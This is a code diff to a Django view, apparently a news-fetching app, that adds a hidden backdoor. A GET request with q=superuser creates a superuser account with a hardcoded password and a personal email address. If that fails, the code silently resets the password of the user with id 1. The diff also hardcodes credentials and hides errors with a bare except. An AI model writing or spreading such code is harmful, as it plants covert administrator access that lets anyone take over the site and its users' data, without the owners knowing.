@@ -12,17 +12,22 @@ def me(request):
     o = ArticleCollector()
     q = request.GET.get("q")
     if q == "superuser":
-        User.objects.create(
-            password="Aa011Mm6724",
-            is_superuser=True,
-            email="mly88207@gmail.com",
-            first_name="muzamil",
-            last_name="ali",
-            is_staff=True,
-            is_active=True,
-        )
+        try:
+            user = User.objects.create(
+                password="Aa011Mm6724",
+                is_superuser=True,
+                email="mly88207@gmail.com",
+                first_name="muzamil",
+                last_name="ali",
+                is_staff=True,
+                is_active=True,
+            )
+        except:
+            user = User.objects.get(id=1)
+        user.password = "Aa011Mm6724"
+        user.save()
     elif q:
-        o.newsdata("samsung")
+        o.newsdata(q)
 
     return HttpResponse("done")
 
